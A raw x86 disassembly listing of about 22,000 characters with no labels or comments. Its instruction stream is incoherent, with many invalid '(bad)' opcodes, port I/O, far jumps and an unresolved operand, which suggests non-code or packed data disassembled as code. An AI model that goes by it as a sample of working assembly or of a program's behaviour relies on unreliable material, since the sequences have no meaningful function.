  41db1b:	pop    edi
  41db1c:	sbb    al,0xcb
  41db1e:	data16 jmp 0x41daab
  41db21:	mov    dh,0x12
  41db23:	add    esi,0xffffffb3
  41db26:	and    DWORD PTR ds:0xf2a1f5f8,ebx
  41db2c:	cmp    BYTE PTR ss:[eax],al
  41db2f:	test   DWORD PTR [esi+0x17],edi
  41db32:	aas    
  41db33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db34:	mov    WORD PTR [edi],ds
  41db36:	adc    eax,0xff27e1ac
  41db3b:	je     0x41db5b
  41db3d:	rol    BYTE PTR [ecx-0xe],1
  41db40:	leave  
  41db41:	ins    BYTE PTR es:[edi],dx
  41db42:	fdivr  DWORD PTR [eax]
  41db44:	push   ebp
  41db45:	xor    BYTE PTR [edi+ebx*4],0x39
  41db49:	les    esi,FWORD PTR [ebp-0x6d48f73b]
  41db4f:	les    esi,FWORD PTR gs:[edi+0x20]
  41db53:	cli    
  41db54:	cmp    eax,0x2bfde674
  41db59:	inc    eax
  41db5a:	mov    WORD PTR [ebx+0x31],ss
  41db5d:	mov    DWORD PTR [ebx-0x1a06d768],esi
  41db63:	sub    al,0x4c
  41db65:	retf   
  41db66:	hlt    
  41db67:	xchg   esi,eax
  41db68:	inc    edx
  41db69:	icebp  
  41db6a:	sub    al,0x3c
  41db6c:	call   0x6179:0xf006d437
  41db73:	mov    bl,0x3a
  41db75:	clc    
  41db76:	addr16 cmp eax,0x450a2883
  41db7c:	scas   eax,DWORD PTR es:[edi]
  41db7d:	sbb    eax,0x71ea2ef9
  41db82:	cmc    
  41db83:	in     eax,dx
  41db84:	sub    al,bh
  41db86:	jl     0x41db9e
  41db88:	(bad)  
  41db89:	cmp    BYTE PTR [edi-0x4b],al
  41db8c:	jno    0x41db25
  41db8e:	imul   edx,DWORD PTR [ebx],0xfffffff8
  41db91:	lea    esp,[ecx-0x3c]
  41db94:	(bad)  
  41db96:	jle    0x41db89
  41db98:	(bad)  
  41db99:	push   edx
  41db9a:	jle    0x41db8f
  41db9c:	das    
  41db9d:	fisub  WORD PTR [esi+0x324e4731]
  41dba3:	lahf   
  41dba4:	(bad)  
  41dba5:	xor    al,ah
  41dba7:	pop    ss
  41dba8:	add    eax,0xeecbb6a4
  41dbad:	in     eax,0x6f
  41dbaf:	lock mov eax,DWORD PTR [edx]
  41dbb2:	rcl    DWORD PTR [esi],1
  41dbb4:	lea    ebp,[ebx-0x3c]
  41dbb7:	dec    edx
  41dbb8:	ret    0xf24a
  41dbbb:	shl    BYTE PTR ds:0xee70a5f2,cl
  41dbc1:	pop    esi
  41dbc2:	fbstp  TBYTE PTR [ecx]
  41dbc4:	and    eax,0x2aa7bc3a
  41dbc9:	inc    edx
  41dbca:	(bad)  
  41dbcb:	repz mov esi,0xa68fc7d
  41dbd1:	inc    esp
  41dbd2:	add    BYTE PTR [ebp-0x1c],al
  41dbd5:	call   0x814c:0xe9f5c359
  41dbdc:	or     dl,BYTE PTR [eax-0x71]
  41dbdf:	sbb    al,0xc3
  41dbe1:	jmp    0x1c685651
  41dbe6:	mov    ecx,0x20223797
  41dbeb:	cli    
  41dbec:	cmc    
  41dbed:	dec    esi
  41dbee:	mov    ds:0xe72d20b1,eax
  41dbf3:	push   ebx
  41dbf4:	sub    al,0xb7
  41dbf6:	(bad)  
  41dbf7:	push   ss
  41dbf8:	jg     0x41dc64
  41dbfa:	sti    
  41dbfb:	adc    BYTE PTR ds:0x5bc07912,bh
  41dc01:	push   edx
  41dc02:	xchg   ebx,eax
  41dc03:	lock in eax,dx
  41dc05:	mov    dh,0xb9
  41dc07:	ins    BYTE PTR es:[edi],dx
  41dc08:	(bad)  
  41dc09:	mov    dl,0x13
  41dc0b:	pusha  
  41dc0c:	sbb    DWORD PTR [ebx+0x6f],edi
  41dc0f:	jb     0x41dbf3
  41dc11:	in     eax,dx
  41dc12:	jae    0x41dc15
  41dc14:	cmp    esi,ebx
  41dc16:	cli    
  41dc17:	xchg   ebp,eax
  41dc18:	outs   dx,BYTE PTR ds:[esi]
  41dc19:	mov    esi,0x43a9f18d
  41dc1e:	fmul   st,st(6)
  41dc20:	(bad)  
  41dc21:	sub    cl,BYTE PTR [ebp-0x47]
  41dc24:	cmp    al,0x65
  41dc26:	xor    esi,ebp
  41dc28:	sbb    ch,BYTE PTR [edx+0x29939cd]
  41dc2e:	rcl    BYTE PTR cs:[edi-0x79],0xce
  41dc33:	adc    ebp,edx
  41dc35:	or     ch,dl
  41dc37:	arpl   WORD PTR [ebx],bp
  41dc39:	les    ebp,FWORD PTR [ebx-0x3a08ecc7]
  41dc3f:	test   eax,0x2b60916a
  41dc44:	jge    0x41dc17
  41dc46:	outs   dx,BYTE PTR ds:[esi]
  41dc47:	mov    ds:0xa295deea,al
  41dc4c:	jmp    0xef4a:0xf0401341
  41dc53:	mov    eax,ds:0x92aad6fe
  41dc58:	jge    0x41dc08
  41dc5a:	pop    eax
  41dc5b:	xor    eax,0xea4acea9
  41dc60:	pop    esi
  41dc61:	sti    
  41dc62:	test   DWORD PTR [ebp-0x6247f326],0x64698cd2
  41dc6c:	retf   0xa6f
  41dc6f:	icebp  
  41dc70:	fild   QWORD PTR [ecx+0x0]
  41dc73:	ret    0xe06
  41dc76:	xchg   ebp,eax
  41dc77:	sahf   
  41dc78:	mov    dl,0x9b
  41dc7a:	mov    ds:0xc1435512,al
  41dc7f:	xchg   DWORD PTR [edx-0x68fe92a5],ecx
  41dc85:	mov    eax,0x21aadd4c
  41dc8a:	sub    eax,0x27d9937f
  41dc8f:	das    
  41dc90:	aam    0x91
  41dc92:	push   0x46
  41dc94:	pop    ss
  41dc95:	or     eax,DWORD PTR [ebx]
  41dc97:	enter  0xd75b,0xb6
  41dc9b:	mov    ah,0x94
  41dc9d:	or     DWORD PTR [ecx+0x30fe419],ebp
  41dca3:	test   BYTE PTR [esi],bl
  41dca5:	dec    eax
  41dca6:	ret    
  41dca7:	add    ecx,DWORD PTR [esi-0x39]
  41dcaa:	inc    ecx
  41dcab:	sub    BYTE PTR [ebp-0x10],dl
  41dcae:	cmp    al,0xc2
  41dcb0:	and    DWORD PTR [ebx+0x73],esp
  41dcb3:	sbb    edi,DWORD PTR ds:0x1340c3d6
  41dcb9:	mov    edx,0x3946f47
  41dcbe:	sub    ebp,ecx
  41dcc0:	xor    al,0x28
  41dcc2:	mov    ds:0x5c63c853,al
  41dcc7:	fcmovnb st,st(6)
  41dcca:	daa    
  41dccb:	sbb    bl,BYTE PTR [ebp+0x1148926d]
  41dcd1:	xor    bh,0x8e
  41dcd4:	dec    esi
  41dcd5:	mov    BYTE PTR [ebp+esi*8+0x53],ch
  41dcd9:	mov    ds,WORD PTR [ecx]
  41dcdb:	mov    esp,0x84b38c23
  41dce0:	retf   0xb888
  41dce3:	push   esp
  41dce4:	repz dec dx
  41dce7:	jle    0x41dd3b
  41dce9:	mov    ebp,0xf3d2fd3
  41dcee:	adc    ebp,ebx
  41dcf0:	pop    edx
  41dcf1:	out    dx,al
  41dcf2:	in     eax,0xcb
  41dcf4:	jo     0x41dcd8
  41dcf6:	sub    DWORD PTR [eax+edx*8-0x64],ebp
  41dcfa:	push   ebx
  41dcfb:	loopne 0x41dcd2
  41dcfd:	add    eax,0x20ec755e
  41dd02:	ret    
  41dd03:	test   al,0x9f
  41dd05:	cmc    
  41dd06:	mov    edx,0x840e2fe0
  41dd0b:	adc    al,0x5b
  41dd0d:	or     DWORD PTR [edx],ebx
  41dd0f:	imul   ebx,DWORD PTR ds:0x5e191143,0x68
  41dd16:	push   ss
  41dd17:	scas   al,BYTE PTR es:[edi]
  41dd18:	fist   WORD PTR [esi-0x7625aec3]
  41dd1e:	(bad)  
  41dd1f:	adc    eax,0xffffff9c
  41dd22:	push   cs
  41dd23:	int    0xf7
  41dd25:	in     al,dx
  41dd26:	or     BYTE PTR [edx+0x7dc1b5d9],0x2
  41dd2d:	cli    
  41dd2e:	or     al,0x77
  41dd30:	xor    DWORD PTR [eax+ecx*2-0x5b1e89b2],esi
  41dd37:	sbb    DWORD PTR [esp+edi*4+0x2b0991bc],0x54ba9458
  41dd42:	fiadd  WORD PTR [ecx+0x3c0f2d3f]
  41dd48:	and    edx,esp
  41dd4a:	adc    bh,BYTE PTR [ecx]
  41dd4c:	out    0x70,al
  41dd4e:	inc    eax
  41dd4f:	pop    edx
  41dd50:	inc    esi
  41dd51:	xchg   al,al
  41dd53:	jmp    0xaeba:0xe0d6cbe4
  41dd5a:	xor    DWORD PTR [eax],esi
  41dd5c:	adc    BYTE PTR [eax-0x388b8007],cl
  41dd62:	mov    ch,cl
  41dd64:	shl    DWORD PTR [ebx+0x53aed029],cl
  41dd6a:	push   ss
  41dd6b:	jle    0x41dd57
  41dd6d:	mov    ds:0xa73e420,al
  41dd72:	fadd   st,st(2)
  41dd74:	daa    
  41dd75:	idiv   BYTE PTR [ebp+0x605f5153]
  41dd7b:	pop    es
  41dd7c:	xchg   esi,eax
  41dd7d:	inc    edi
  41dd7e:	dec    ebx
  41dd7f:	inc    edx
  41dd80:	xchg   edi,eax
  41dd81:	out    dx,eax
  41dd82:	test   edx,esp
  41dd84:	dec    edx
  41dd85:	jno    0x41ddd1
  41dd87:	mov    bh,0x80
  41dd89:	or     DWORD PTR [edx-0x6b31a1a8],edi
  41dd8f:	imul   ecx,DWORD PTR [ebx],0x17
  41dd92:	ins    BYTE PTR es:[edi],dx
  41dd93:	pop    es
  41dd94:	sbb    BYTE PTR [ebx],dl
  41dd96:	push   esi
  41dd97:	and    al,0x70
  41dd99:	gs push ebx
  41dd9b:	hlt    
  41dd9c:	pusha  
  41dd9d:	mov    esi,0x16d13a50
  41dda2:	into   
  41dda3:	jecxz  0x41dd2f
  41dda5:	add    bh,BYTE PTR [edi+0x5cfdecd1]
  41ddab:	push   ss
  41ddac:	test   BYTE PTR [edi-0x6f0927a6],dh
  41ddb2:	fcomp  st(5)
  41ddb4:	je     0x41dd52
  41ddb6:	dec    edi
  41ddb7:	pop    dx
  41ddb9:	lock hlt 
  41ddbb:	lods   al,BYTE PTR ds:[esi]
  41ddbc:	cmp    ecx,DWORD PTR [edx+0x21999fe8]
  41ddc2:	outs   dx,BYTE PTR ds:[esi]
  41ddc3:	mov    ds:0x9011fa20,al
  41ddc8:	add    al,0x6f
  41ddca:	lahf   
  41ddcb:	daa    
  41ddcc:	rcr    edi,0x10
  41ddcf:	test   al,0x15
  41ddd1:	jg     0x41dd86
  41ddd3:	int3   
  41ddd4:	test   eax,0x27a07b48
  41ddd9:	push   edi
  41ddda:	in     al,0x8b
  41dddc:	adc    BYTE PTR ds:[ecx+0x28],bl
  41dde0:	and    ch,BYTE PTR [edi+0x5ea134ff]
  41dde6:	rol    BYTE PTR [edi+0x2b],0x90
  41ddea:	jns    0x41dd80
  41ddec:	mov    edi,0xa5c55212
  41ddf1:	sti    
  41ddf2:	or     edi,ebx
  41ddf4:	int    0x4
  41ddf6:	fst    QWORD PTR [ecx]
  41ddf8:	pusha  
  41ddf9:	shl    DWORD PTR [edx+0x4c8c9f77],0x55
  41de00:	xchg   ecx,eax
  41de01:	sub    ebp,ebp
  41de03:	inc    eax
  41de04:	mov    dl,0xd5
  41de06:	je     0x41ddf7
  41de08:	int3   
  41de09:	in     al,dx
  41de0a:	mov    edi,0x5dae5a1c
  41de0f:	dec    esp
  41de10:	inc    ebp
  41de11:	add    BYTE PTR [edx-0x4c],dh
  41de14:	mov    cs,WORD PTR [ecx]
  41de16:	xchg   edi,eax
  41de17:	cmp    cl,BYTE PTR [ecx]
  41de19:	xchg   DWORD PTR [edi-0x1383de43],esi
  41de1f:	mov    BYTE PTR [edi+edx*1-0x7d6dc213],dl
  41de26:	dec    ebx
  41de27:	scas   eax,DWORD PTR es:[edi]
  41de28:	repz jae 0x41de41
  41de2b:	fiadd  WORD PTR [esi]
  41de2d:	fsubp  st(7),st
  41de2f:	addr16 retf 0xde29
  41de33:	sqrtps xmm5,xmm2
  41de36:	mov    ds:0x3da2eb68,eax
  41de3b:	ss dec ecx
  41de3d:	jmp    0x164dbf71
  41de42:	ja     0x41dde9
  41de44:	fbstp  TBYTE PTR [edi+0x52768a87]
  41de4a:	sub    al,0x78
  41de4c:	inc    ecx
  41de4d:	scas   eax,DWORD PTR es:[edi]
  41de4e:	sbb    eax,0x6c42b6f4
  41de53:	adc    BYTE PTR [edx+0x38],bl
  41de56:	and    DWORD PTR [ebx],esi
  41de58:	push   ecx
  41de59:	ret    0x6dcf
  41de5c:	(bad)  
  41de5d:	xor    al,0x7a
  41de5f:	retf   
  41de60:	jb     0x41ddf2
  41de62:	cmp    al,0x7d
  41de64:	xor    al,0x63
  41de66:	push   0xf47b6fd8
  41de6b:	sub    al,0x81
  41de6d:	pop    ebx
  41de6e:	sbb    eax,0x8f228f97
  41de73:	push   edi
  41de74:	das    
  41de75:	sahf   
  41de76:	frstor [edi]
  41de78:	xor    DWORD PTR [edi+ebp*2-0x72],esp
  41de7c:	mov    ebx,0xe2b2f124
  41de81:	fwait
  41de82:	popa   
  41de83:	xchg   ecx,eax
  41de84:	fdivp  st(7),st
  41de86:	fld    QWORD PTR [esi-0x1d]
  41de89:	js     0x41de28
  41de8b:	cs mov esp,0xfbe743e
  41de91:	fldcw  WORD PTR [eax+0x5997eeab]
  41de97:	js     0x41df15
  41de99:	and    al,0x41
  41de9b:	sti    
  41de9c:	adc    al,0x8a
  41de9e:	jbe    0x41de9d
  41dea0:	data16 loopne 0x41de39
  41dea3:	pushf  
  41dea4:	rcr    DWORD PTR [esi+0xc],0x31
  41dea8:	mov    edx,0x66dca588
  41dead:	jns    0x41df2b
  41deaf:	test   eax,0x6db5bf7b
  41deb4:	data16 daa 
  41deb6:	ss repnz das 
  41deb9:	push   esp
  41deba:	add    DWORD PTR [ecx+0x4],edx
  41debd:	jg     0x41de57
  41debf:	outs   dx,BYTE PTR ds:[esi]
  41dec0:	push   0xffffffb2
  41dec2:	xchg   esi,eax
  41dec3:	aas    
  41dec4:	(bad)  
  41dec5:	fst    QWORD PTR [esi+0x3d]
  41dec8:	ss daa 
  41deca:	(bad)  
  41decb:	inc    ecx
  41decc:	leave  
  41decd:	push   edx
  41dece:	push   0x3
  41ded0:	stc    
  41ded1:	imul   DWORD PTR [eax]
  41ded3:	inc    esi
  41ded4:	push   0xffffffad
  41ded6:	mov    al,ds:0xe55b9206
  41dedb:	push   ecx
  41dedc:	sbb    eax,0x6c57a215
  41dee1:	xchg   esi,eax
  41dee2:	cli    
  41dee3:	in     al,0xe9
  41dee5:	loope  0x41deff
  41dee7:	sbb    eax,0xe4ec91a5
  41deec:	std    
  41deed:	pop    eax
  41deee:	pop    ebx
  41deef:	mov    eax,ds:0xb3de1a38
  41def4:	and    eax,0x8157d3d8
  41def9:	popa   
  41defa:	repz clc 
  41defc:	add    al,BYTE PTR [edi+0x7baf54bf]
  41df02:	pusha  
  41df03:	test   eax,0x1e7e06a3
  41df08:	jbe    0x41df1f
  41df0a:	lock or bl,ah
  41df0d:	pusha  
  41df0e:	(bad)  
  41df10:	xchg   ebp,eax
  41df11:	sbb    al,0x71
  41df13:	and    eax,0x2659de83
  41df18:	push   es
  41df19:	cmp    BYTE PTR [eax+0x43783c67],0x52
  41df20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df21:	test   BYTE PTR ds:0xeb194606,ah
  41df27:	inc    eax
  41df28:	adc    bl,dl
  41df2a:	inc    edi
  41df2b:	adc    DWORD PTR ds:0x36484701,esi
  41df31:	mov    DWORD PTR [ecx],ebp
  41df33:	repnz addr16 nop
  41df36:	inc    ebp
  41df37:	mov    al,0x36
  41df39:	mov    al,ds:0x2b0573d8
  41df3e:	cs push esi
  41df40:	in     eax,0xf8
  41df42:	add    cl,BYTE PTR [edx-0x7a]
  41df45:	(bad)  
  41df47:	xchg   edi,eax
  41df48:	push   esi
  41df49:	push   edi
  41df4a:	arpl   WORD PTR [edi+eiz*2],si
  41df4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df4e:	cwde   
  41df4f:	call   0x6f0:0xa9e57823
  41df56:	sub    ah,BYTE PTR [ecx+0x78fe4ef1]
  41df5c:	mov    ebx,0x7e427065
  41df61:	cli    
  41df62:	sub    edx,DWORD PTR [esi-0x77]
  41df65:	lock push esi
  41df67:	outs   dx,DWORD PTR ds:[esi]
  41df68:	jecxz  0x41dfd0
  41df6a:	popa   
  41df6b:	mov    BYTE PTR [ebp-0x730cca9],dl
  41df71:	cld    
  41df72:	int    0x3b
  41df74:	or     BYTE PTR [ebx],bh
  41df76:	cli    
  41df77:	xchg   ecx,eax
  41df78:	je     0x41df34
  41df7a:	out    0x5f,al
  41df7c:	popa   
  41df7d:	cmc    
  41df7e:	sub    eax,0x76047214
  41df83:	pop    eax
  41df84:	sbb    BYTE PTR [ecx+0x64],0x7d
  41df88:	inc    edx
  41df89:	add    al,0xac
  41df8b:	or     al,0xd4
  41df8d:	mov    eax,0x2b370ba
  41df92:	scas   eax,DWORD PTR es:[di]
  41df94:	mov    dl,0x18
  41df96:	pop    edi
  41df97:	cmp    al,BYTE PTR [ebx]
  41df99:	pushf  
  41df9a:	lock gs out dx,eax
  41df9d:	int3   
  41df9e:	or     DWORD PTR [ecx+0x14],esi
  41dfa1:	pop    es
  41dfa2:	stos   BYTE PTR es:[edi],al
  41dfa3:	and    BYTE PTR [edi-0x2b],0x27
  41dfa7:	mov    ebx,0xcfc5cd71
  41dfac:	test   BYTE PTR [esi],dh
  41dfae:	idiv   cl
  41dfb0:	inc    ebx
  41dfb1:	loop   0x41df83
  41dfb3:	cdq    
  41dfb4:	nop
  41dfb5:	sbb    al,0x45
  41dfb7:	not    BYTE PTR [ebx+0x39]
  41dfba:	retf   0x3348
  41dfbd:	repnz out dx,eax
  41dfbf:	cmp    DWORD PTR [esi+edx*4+0x4c],esp
  41dfc3:	adc    al,0x84
  41dfc5:	icebp  
  41dfc6:	lea    eax,[ebx]
  41dfc8:	mov    es,WORD PTR [edi+0x44751b4a]
  41dfce:	(bad)  
  41dfcf:	hlt    
  41dfd0:	pcmpeqd mm1,QWORD PTR [eax+ecx*1]
  41dfd4:	or     al,BYTE PTR [edi-0x3c]
  41dfd7:	shr    BYTE PTR [eax-0x7f],1
  41dfda:	pop    ebx
  41dfdb:	lds    ebx,FWORD PTR [edi-0x63]
  41dfde:	sar    esi,1
  41dfe0:	cmp    dl,BYTE PTR [ecx+0x11d57f1d]
  41dfe6:	push   0xbcaf2bdd
  41dfeb:	lds    edx,FWORD PTR [edi+0x1dd8fa83]
  41dff1:	mov    ebx,0xb4a93905
  41dff6:	inc    esp
  41dff7:	mov    DWORD PTR [esi],ebp
  41dff9:	ins    BYTE PTR es:[edi],dx
  41dffa:	ficomp DWORD PTR [edi+0x47aae061]
  41e000:	rcl    ch,cl
  41e002:	inc    eax
  41e003:	xor    BYTE PTR [ecx],0x4e
  41e006:	and    bl,bl
  41e008:	lea    edx,[edi]
  41e00a:	push   ecx
  41e00b:	cmp    dh,BYTE PTR [eax+0x57f6b63d]
  41e011:	pop    es
  41e012:	inc    ebp
  41e013:	or     esp,eax
  41e015:	and    esi,ecx
  41e017:	in     al,dx
  41e018:	repz mov ss,WORD PTR [ebp+0x1e93b344]
  41e01f:	add    BYTE PTR [ecx+0x424b39b0],dl
  41e025:	xchg   esp,eax
  41e026:	in     eax,0xb8
  41e028:	fsubr  DWORD PTR [edi-0x75]
  41e02c:	icebp  
  41e02d:	test   BYTE PTR [esi+0x6a],dl
  41e030:	ds xchg edi,eax
  41e032:	xor    al,0xa7
  41e034:	in     eax,0xd0
  41e036:	or     DWORD PTR [eax],esi
  41e038:	inc    eax
  41e039:	repz ds jle 0x41e0ba
  41e03d:	add    eax,0xf82b1070
  41e042:	in     eax,dx
  41e043:	mov    edx,0x6bddc7c6
  41e048:	pushf  
  41e049:	push   DWORD PTR [edx+0x12656064]
  41e04f:	sub    eax,0x62da3fe3
  41e054:	sub    DWORD PTR [eax],ebp
  41e056:	nop
  41e057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e058:	or     al,BYTE PTR fs:[edi+ecx*2-0x4]
  41e05d:	inc    esp
  41e05e:	lea    esp,[edx-0x38bd76d8]
  41e064:	jp     0x41e0d5
  41e066:	dec    ebx
  41e067:	xor    DWORD PTR [eax],ebx
  41e069:	inc    esp
  41e06a:	cmp    eax,0x20d483c7
  41e06f:	push   edi
  41e070:	xor    BYTE PTR [ebx+0x6e],ch
  41e073:	dec    eax
  41e074:	fmul   DWORD PTR [ebx-0x44868a27]
  41e07a:	cs xchg ebx,eax
  41e07c:	into   
  41e07d:	fs and eax,0x2daa98d1
  41e083:	jo     0x41e0f2
  41e085:	sub    esp,DWORD PTR [eax+0x1b]
  41e088:	mov    ?,eax
  41e08a:	ja     0x41e0f2
  41e08c:	or     DWORD PTR [eax+0xf1ef3a8],0x278e9cc0
  41e096:	and    esi,DWORD PTR [esi-0x693337d3]
  41e09c:	rol    BYTE PTR [edx+0x277d73a7],1
  41e0a2:	shl    cl,0xf2
  41e0a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0a6:	pusha  
  41e0a7:	jnp    0x41e05d
  41e0a9:	in     eax,dx
  41e0aa:	shl    DWORD PTR [ebx+0x75],1
  41e0ad:	jl     0x41e0af
  41e0af:	call   0x3512:0x4fc16c0a
  41e0b6:	addr16 cmp al,0xb7
  41e0b9:	out    dx,eax
  41e0ba:	ror    BYTE PTR [ebx-0x7b88208a],0x30
  41e0c1:	scas   eax,DWORD PTR es:[edi]
  41e0c2:	pusha  
  41e0c3:	and    eax,0x9d49fc3d
  41e0c8:	(bad)  
  41e0c9:	out    dx,al
  41e0ca:	or     DWORD PTR [eax-0x70],0xffffffa3
  41e0ce:	sub    esi,ebx
  41e0d0:	clc    
  41e0d1:	push   ebx
  41e0d2:	out    0x86,al
  41e0d4:	adc    eax,0x45736967
  41e0d9:	ret    
  41e0da:	(bad)  
  41e0db:	arpl   WORD PTR [edi+0x36546069],si
  41e0e1:	jmp    0x41e10a
  41e0e3:	outs   dx,DWORD PTR ds:[esi]
  41e0e4:	ja     0x41e07f
  41e0e6:	pop    ds
  41e0e7:	test   eax,0x8e4bf504
  41e0ec:	cdq    
  41e0ed:	pop    esp
  41e0ee:	xchg   esi,eax
  41e0ef:	loop   0x41e144
  41e0f1:	mov    ds:0xae79b2b0,al
  41e0f6:	mov    eax,ds:0x49904977
  41e0fb:	out    0xc1,eax
  41e0fd:	jle    0x41e0c9
  41e0ff:	push   edx
  41e100:	push   edi
  41e101:	sbb    eax,0xd0e32703
  41e106:	rcl    edx,0x98
  41e109:	loop   0x41e155
  41e10b:	push   esi
  41e10c:	(bad)  [esi-0x72]
  41e10f:	jle    0x41e144
  41e111:	dec    esp
  41e112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e113:	shl    ch,1
  41e115:	sbb    DWORD PTR es:[edi+0x6a],edx
  41e119:	bound  edi,QWORD PTR [ebx-0x41d0e309]
  41e11f:	push   0xdbba7cf9
  41e124:	pop    edx
  41e125:	shl    DWORD PTR [ecx],cl
  41e127:	loop   0x41e107
  41e129:	and    esi,DWORD PTR [ebp-0x48caf82d]
  41e12f:	pop    ecx
  41e130:	daa    
  41e131:	pusha  
  41e132:	shl    esp,1
  41e134:	into   
  41e135:	or     edi,DWORD PTR [ecx+esi*4]
  41e138:	out    dx,al
  41e139:	out    0xed,eax
  41e13b:	inc    esi
  41e13c:	call   0x324e:0x625c9f4e
  41e143:	inc    ebp
  41e144:	sahf   
  41e145:	xchg   edx,eax
  41e146:	daa    
  41e147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e148:	xlat   BYTE PTR ds:[ebx]
  41e149:	test   eax,0x393dfea6
  41e14e:	sbb    ah,ah
  41e150:	shl    BYTE PTR [edx],0xf5
  41e153:	push   eax
  41e154:	aad    0x24
  41e156:	test   al,0x46
  41e158:	dec    ecx
  41e159:	sub    BYTE PTR [ecx+edx*1-0x68],bl
  41e15d:	xor    BYTE PTR [edx],0x8e
  41e160:	std    
  41e161:	adc    eax,0xeb55720d
  41e166:	pop    ecx
  41e167:	sbb    bl,0x8e
  41e16a:	mov    ds:0x4fe38b8,al
  41e16f:	and    BYTE PTR [ebp-0x55d994e5],al
  41e175:	pop    DWORD PTR [edi-0x2dcfaccd]
  41e17b:	inc    ebx
  41e17c:	je     0x41e1e8
  41e17e:	shl    cl,0x63
  41e181:	popa   
  41e182:	jo     0x41e165
  41e184:	gs jnp 0x41e110
  41e187:	sbb    DWORD PTR [edi+0x2dc350de],esp
  41e18d:	dec    esi
  41e18e:	je     0x41e14f
  41e190:	imul   DWORD PTR [ecx]
  41e192:	mov    dh,0x3
  41e194:	cs push edi
  41e196:	mov    ebp,0xf444da41
  41e19b:	sbb    ebx,esp
  41e19d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41e19f:	rcl    BYTE PTR [ebp+0x79],cl
  41e1a2:	cmp    BYTE PTR [ebx-0x1989bc44],0xdf
  41e1a9:	push   0xffffff96
  41e1ab:	push   cs
  41e1ac:	fisttp QWORD PTR [ebx+esi*1]
  41e1af:	adc    DWORD PTR [edi],ebx
  41e1b1:	ss sahf 
  41e1b3:	sbb    al,BYTE PTR [esi-0x3f4eddf2]
  41e1b9:	into   
  41e1ba:	and    eax,0x8de35323
  41e1bf:	pop    eax
  41e1c0:	ffree  st(3)
  41e1c2:	pop    eax
  41e1c3:	fadd   DWORD PTR [ecx+ecx*1-0x25491609]
  41e1ca:	jo     0x41e1f6
  41e1cc:	(bad)  [eax+0x660526c7]
  41e1d2:	retf   0x1588
  41e1d5:	fprem1 
  41e1d7:	pop    edx
  41e1d8:	sahf   
  41e1d9:	fild   QWORD PTR [edi]
  41e1db:	aad    0xcc
  41e1dd:	std    
  41e1de:	aam    0xdd
  41e1e0:	jno    0x41e1b3
  41e1e2:	sbb    BYTE PTR [ebx+ebx*8-0x1],al
  41e1e6:	cmp    esi,DWORD PTR [edi-0x7570e612]
  41e1ec:	push   es
  41e1ed:	adc    eax,0x5b909f0d
  41e1f2:	leave  
  41e1f3:	inc    edx
  41e1f4:	adc    dl,al
  41e1f6:	loopne 0x41e18d
  41e1f8:	icebp  
  41e1f9:	push   0x46ba40ca
  41e1fe:	sti    
  41e1ff:	or     dh,BYTE PTR [ebp-0x48]
  41e202:	lahf   
  41e203:	mov    dl,0x7c
  41e205:	pop    eax
  41e206:	adc    ecx,DWORD PTR ds:0x8e8201bd
  41e20c:	mov    eax,ds:0xaf876525
  41e211:	jmp    0x41e234
  41e213:	mov    bh,0xc3
  41e215:	add    ebp,DWORD PTR [eax-0x2]
  41e218:	in     al,0x6f
  41e21a:	cmp    bh,BYTE PTR [edx-0x68ea9aae]
  41e220:	(bad)  
  41e221:	jo     0x41e1de
  41e223:	dec    edi
  41e224:	and    DWORD PTR [ebx+ecx*8+0x64],eax
  41e228:	jbe    0x41e208
  41e22a:	jae    0x41e203
  41e22c:	push   ebp
  41e22d:	das    
  41e22e:	and    eax,DWORD PTR [edx+0x1ac843b]
  41e234:	and    al,0x41
  41e236:	xchg   DWORD PTR [esp+ebp*1],ecx
  41e239:	xlat   BYTE PTR ds:[ebx]
  41e23a:	cmp    bl,bl
  41e23c:	arpl   WORD PTR [ebp-0xf015fd9],bx
  41e242:	sbb    ebx,eax
  41e244:	lods   al,BYTE PTR ds:[esi]
  41e245:	and    eax,0xbc708756
  41e24a:	mov    ecx,0x42a9c5bc
  41e24f:	es xchg ebp,eax
  41e251:	ins    DWORD PTR es:[edi],dx
  41e252:	imul   ebp,eax,0xffffffcb
  41e255:	fcomp  DWORD PTR [esi-0x44]
  41e258:	ficom  DWORD PTR [ebx+0x5e]
  41e25b:	sub    edx,DWORD PTR [ebx-0x5e7649c9]
  41e261:	xor    eax,0x4112dc42
  41e266:	mov    esp,0x5ff3dca6
  41e26b:	push   DWORD PTR [edx]
  41e26d:	frstor [eax+0x29]
  41e270:	aas    
  41e271:	ffreep st(5)
  41e273:	jno    0x41e24e
  41e275:	xchg   ebp,eax
  41e276:	pop    ecx
  41e277:	int    0x22
  41e279:	aas    
  41e27a:	add    al,0x3e
  41e27c:	(bad)  
  41e27d:	adc    BYTE PTR [eax],ah
  41e27f:	mov    eax,ds:0x472fc27c
  41e284:	xor    eax,0x40d00bb0
  41e289:	out    0x98,al
  41e28b:	repz pop es
  41e28d:	sub    DWORD PTR [ebp-0x6],0xff328df
  41e294:	cli    
  41e295:	jmp    0x3420:0xaf14b905
  41e29c:	push   ds
  41e29d:	mov    ebp,0x6dbb7202
  41e2a2:	jle    0x41e24d
  41e2a4:	add    edx,ebx
  41e2a6:	xchg   BYTE PTR [ebx+0x1845af9a],bl
  41e2ac:	pop    esp
  41e2ad:	ret    
  41e2ae:	mov    ah,BYTE PTR [ebx+0x39]
  41e2b1:	aaa    
  41e2b2:	mov    dh,0x78
  41e2b4:	push   ss
  41e2b5:	sbb    al,BYTE PTR [ecx]
  41e2b7:	xchg   edx,eax
  41e2b8:	jmp    0x8a05e805
  41e2bd:	scas   al,BYTE PTR es:[edi]
  41e2be:	inc    ebx
  41e2bf:	popf   
  41e2c0:	push   ds
  41e2c1:	data16 cmp al,0xee
  41e2c4:	xchg   ecx,eax
  41e2c5:	adc    al,0x57
  41e2c7:	sub    eax,0x82da3b6b
  41e2cc:	fdivr  QWORD PTR [edi+0x4a]
  41e2cf:	sub    eax,0xfe736bb0
  41e2d4:	pop    edx
  41e2d5:	xor    eax,0x245354cd
  41e2da:	push   esp
  41e2db:	in     eax,0xcf
  41e2dd:	adc    DWORD PTR [ecx+0x58],0x55e9da21
